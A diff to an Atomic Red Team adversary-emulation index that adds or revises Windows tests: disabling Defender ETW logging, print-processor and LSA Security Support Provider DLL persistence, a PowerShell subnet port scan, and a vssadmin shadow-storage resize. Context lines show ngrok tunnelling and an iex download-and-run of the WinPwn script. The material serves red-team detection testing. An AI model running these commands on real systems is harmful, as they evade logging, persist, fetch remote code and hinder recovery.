@@ -10603,6 +10603,23 @@ defense-evasion:
           '
         name: powershell
         elevation_required: true
+    - name: Allow Simultaneous Download Registry
+      auto_generated_guid: 37950714-e923-4f92-8c7c-51e4b6fffbf6
+      description: 'A registry modification to allow Simultaneous download in the
+        system.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /t REG_DWORD /d 10 /f
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d 10 /f
+        cleanup_command: |
+          reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPerServer" /f
+          reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "MaxConnectionsPer1_0Server" /f
+        name: command_prompt
+        elevation_required: true
   T1574.008:
     technique:
       modified: '2023-03-30T21:01:44.781Z'
@@ -12760,15 +12777,16 @@ defense-evasion:
       description: |
         An adversary can disable the ETW Provider of Windows Defender,
         so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
+        https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
       supported_platforms:
       - windows
       executor:
         command: 'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
-          Defender" /v Operational /t REG_DWORD /d 0 /f
+          Defender/Operational" /v Enabled /t REG_DWORD /d 0 /f
 
           '
         cleanup_command: 'reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
-          Defender" /v Operational /f >nul 2>&1
+          Defender/Operational" /v Enabled /f >nul 2>&1
 
           '
         name: command_prompt
@@ -12778,15 +12796,16 @@ defense-evasion:
       description: |
         An adversary can disable the ETW Provider of Windows Defender,
         so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
+        https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
       supported_platforms:
       - windows
       executor:
         command: 'New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
-          Defender" -Name Operational  -PropertyType DWord -Value 0 -Force
+          Defender/Operational" -Name Enabled  -PropertyType DWord -Value 0 -Force
 
           '
         cleanup_command: 'Remove-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
-          Defender" -Name Operational -Force -ErrorAction Ignore
+          Defender/Operational" -Name Enabled -Force -ErrorAction Ignore
 
           '
         name: powershell
@@ -29045,7 +29064,7 @@ privilege-escalation:
         description: Tartare, M. et al. (2020, May 21). No “Game over” for the Winnti
           Group. Retrieved August 24, 2020.
       modified: '2020-10-09T16:05:36.344Z'
-      name: Print Processors
+      name: 'Boot or Logon Autostart Execution: Print Processors'
       description: "Adversaries may abuse print processors to run malicious DLLs during
         system boot for persistence and/or privilege escalation. Print processors
         are DLLs that are loaded by the print spooler service, spoolsv.exe, during
@@ -29085,7 +29104,43 @@ privilege-escalation:
       x_mitre_permissions_required:
       - Administrator
       - SYSTEM
-    atomic_tests: []
+      identifier: T1547.012
+    atomic_tests:
+    - name: Print Processors
+      auto_generated_guid: f3734138-8362-43fd-a995-f89222112f2b
+      description: |
+        Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors.
+        The new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\Users\Public\ as validation that the test is successful.
+
+        Note: The test assumes a x64 Windows operating system.
+
+        The payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)
+      supported_platforms:
+      - windows
+      input_arguments:
+        restart:
+          description: set to 1 if you want the computer to reboot as part of the
+            test
+          type: integer
+          default: 0
+      executor:
+        command: |
+          if( $(get-service -Name spooler).StartType -eq "Disabled") {Set-Service -Name "spooler" -StartupType Automatic}
+          net stop spooler
+          Copy-Item $PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
+          reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /v "Driver" /d "AtomicTest.dll" /t REG_SZ /f
+          net start spooler
+          if(#{restart}){
+            Restart-Computer
+          }
+        cleanup_command: |
+          net stop spooler
+          rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue
+          rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue
+          remove-item "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" -Force -ErrorAction SilentlyContinue
+          net start spooler
+        name: powershell
+        elevation_required: true
   T1574.001:
     technique:
       modified: '2023-03-30T21:01:51.098Z'
@@ -30561,28 +30616,43 @@ privilege-escalation:
       - Administrator
       identifier: T1547.005
     atomic_tests:
-    - name: Modify SSP configuration in registry
+    - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider
+        configuration in registry
       auto_generated_guid: afdfd7e3-8a0b-409f-85f7-886fdf249c9e
+      description: |
+        Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.
+        A common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
+          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' -Value "$oldvalue";
+          $newvalue = "AtomicTest.dll";
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
+        cleanup_command: |-
+          $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
+          Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value "$oldvalue";
+          Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old';
+        name: powershell
+        elevation_required: true
+    - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support
+        Provider configuration in registry
+      auto_generated_guid: 7b74ed07-9723-4f11-81b0-acd50af4fd9e
       description: Add a value to a Windows registry SSP key, simulating an adversarial
         modification of those keys.
       supported_platforms:
       - windows
-      input_arguments:
-        fake_ssp_dll:
-          description: Value added to registry key. Normally refers to a DLL name
-            in C:\Windows\System32.
-          type: string
-          default: not-a-ssp
       executor:
         command: |
-          # run these in sequence
-          $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
-          $SecurityPackagesUpdated = $SecurityPackages
-          $SecurityPackagesUpdated += "#{fake_ssp_dll}"
-          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated
-
-          # revert (before reboot)
-          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages
+          $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
+          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' -Value "$oldvalue";
+          $newvalue = "AtomicTest.dll";
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue
+        cleanup_command: |-
+          $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
+          Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value "$oldvalue";
+          Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old';
         name: powershell
         elevation_required: true
   T1181:
@@ -49150,7 +49220,7 @@ persistence:
         description: Tartare, M. et al. (2020, May 21). No “Game over” for the Winnti
           Group. Retrieved August 24, 2020.
       modified: '2020-10-09T16:05:36.344Z'
-      name: Print Processors
+      name: 'Boot or Logon Autostart Execution: Print Processors'
       description: "Adversaries may abuse print processors to run malicious DLLs during
         system boot for persistence and/or privilege escalation. Print processors
         are DLLs that are loaded by the print spooler service, spoolsv.exe, during
@@ -49190,7 +49260,43 @@ persistence:
       x_mitre_permissions_required:
       - Administrator
       - SYSTEM
-    atomic_tests: []
+      identifier: T1547.012
+    atomic_tests:
+    - name: Print Processors
+      auto_generated_guid: f3734138-8362-43fd-a995-f89222112f2b
+      description: |
+        Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors.
+        The new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\Users\Public\ as validation that the test is successful.
+
+        Note: The test assumes a x64 Windows operating system.
+
+        The payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)
+      supported_platforms:
+      - windows
+      input_arguments:
+        restart:
+          description: set to 1 if you want the computer to reboot as part of the
+            test
+          type: integer
+          default: 0
+      executor:
+        command: |
+          if( $(get-service -Name spooler).StartType -eq "Disabled") {Set-Service -Name "spooler" -StartupType Automatic}
+          net stop spooler
+          Copy-Item $PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
+          reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" /v "Driver" /d "AtomicTest.dll" /t REG_SZ /f
+          net start spooler
+          if(#{restart}){
+            Restart-Computer
+          }
+        cleanup_command: |
+          net stop spooler
+          rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue
+          rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue
+          remove-item "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam" -Force -ErrorAction SilentlyContinue
+          net start spooler
+        name: powershell
+        elevation_required: true
   T1574.001:
     technique:
       modified: '2023-03-30T21:01:51.098Z'
@@ -51401,28 +51507,43 @@ persistence:
       - Administrator
       identifier: T1547.005
     atomic_tests:
-    - name: Modify SSP configuration in registry
+    - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider
+        configuration in registry
       auto_generated_guid: afdfd7e3-8a0b-409f-85f7-886fdf249c9e
+      description: |
+        Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.
+        A common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
+          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' -Value "$oldvalue";
+          $newvalue = "AtomicTest.dll";
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
+        cleanup_command: |-
+          $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
+          Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value "$oldvalue";
+          Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old';
+        name: powershell
+        elevation_required: true
+    - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support
+        Provider configuration in registry
+      auto_generated_guid: 7b74ed07-9723-4f11-81b0-acd50af4fd9e
       description: Add a value to a Windows registry SSP key, simulating an adversarial
         modification of those keys.
       supported_platforms:
       - windows
-      input_arguments:
-        fake_ssp_dll:
-          description: Value added to registry key. Normally refers to a DLL name
-            in C:\Windows\System32.
-          type: string
-          default: not-a-ssp
       executor:
         command: |
-          # run these in sequence
-          $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
-          $SecurityPackagesUpdated = $SecurityPackages
-          $SecurityPackagesUpdated += "#{fake_ssp_dll}"
-          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated
-
-          # revert (before reboot)
-          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages
+          $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
+          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' -Value "$oldvalue";
+          $newvalue = "AtomicTest.dll";
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue
+        cleanup_command: |-
+          $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
+          Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value "$oldvalue";
+          Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old';
         name: powershell
         elevation_required: true
   T1004:
@@ -61297,7 +61418,7 @@ persistence:
         D. - Defending O365 - 2019)"
       modified: '2022-04-19T14:55:26.110Z'
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: Additional Email Delegate Permissions
+      name: 'Account Manipulation: Additional Email Delegate Permissions'
       x_mitre_detection: "Monitor for unusual Exchange and Office 365 email account
         permissions changes that may indicate excessively broad permissions being
         granted to compromised accounts.\n\nEnable the UpdateFolderPermissions action
@@ -61318,6 +61439,7 @@ persistence:
       - 'Application Log: Application Log Content'
       x_mitre_attack_spec_version: 2.1.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1098.002
     atomic_tests: []
   T1084:
     technique:
@@ -64138,7 +64260,7 @@ command-and-control:
           Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\Users\Public\ngrok
       executor:
         command: "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token}
-          | Out-Null\nStart-ThreadJob -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe
+          | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe
           tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n"
         cleanup_command: |
           Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
@@ -67099,7 +67221,7 @@ collection:
           dir
     - name: Compress Data and lock with password for Exfiltration with 7zip
       auto_generated_guid: d1334303-59cb-4a03-8313-b3e24d02c198
-      description: 'Note: Requires 7zip installation
+      description: 'Note: This test requires 7zip installation
 
         '
       supported_platforms:
@@ -87713,6 +87835,57 @@ discovery:
           iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
           fruit -noninteractive -consoleoutput
         name: powershell
+    - name: Port-Scanning /24 Subnet with PowerShell
+      auto_generated_guid: 8c5823c4-af53-4d2f-9865-d08dbab1e579
+      description: |
+        Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's "primary" IPv4 address first and then scans that address with a /24 netmask.
+        The connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        ip_address:
+          description: IP-Address within the target subnet. Default is empty and script
+            tries to determine local IP address of attacking machine.
+          type: string
+          default: ''
+        port_list:
+          description: Comma separated list of ports to scan
+          type: string
+          default: 445, 3389
+        timeout_ms:
+          description: Connection timeout in milliseconds
+          type: string
+          default: '200'
+      executor:
+        command: |
+          $ipAddr = "#{ip_address}"
+          if ($ipAddr -eq "") {
+              # Assumes the "primary" interface is shown at the top
+              $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
+              Write-Host "[i] Using Interface $interface"
+              $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
+          }
+          Write-Host "[i] Base IP-Address for Subnet: $ipAddr"
+          $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
+          # Always assumes /24 subnet
+          Write-Host "[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'"
+
+          $ports = #{port_list}
+          $subnetIPs = 1..254 | ForEach-Object { "$subnetSubstring$_" }
+
+          foreach ($ip in $subnetIPs) {
+              foreach ($port in $ports) {
+                try {
+                    $tcp = New-Object Net.Sockets.TcpClient
+                    $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
+                } catch {}
+                if ($tcp.Connected) {
+                    $tcp.Close()
+                    Write-Host "Port $port is open on $ip"
+                }
+              }
+          }
+        name: powershell
   T1518:
     technique:
       modified: '2023-03-30T21:01:50.920Z'
@@ -95388,6 +95561,18 @@ impact:
           reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
           reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1
         name: command_prompt
+        elevation_required: true
+    - name: Windows - vssadmin Resize Shadowstorage Volume
+      auto_generated_guid: 4742f05d-3e79-4952-8994-6fc272ed526c
+      description: Adversaries generally try to Resize Shadowstorage Volume using
+        vssadmin.exe to avoid the shadow volumes being made again. This technique
+        is typically found used by adversaries during a ransomware event and a precursor
+        to deleting the shadowstorage.
+      supported_platforms:
+      - windows
+      executor:
+        command: 'vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%'
+        name: powershell
         elevation_required: true
   T1561.001:
     technique:
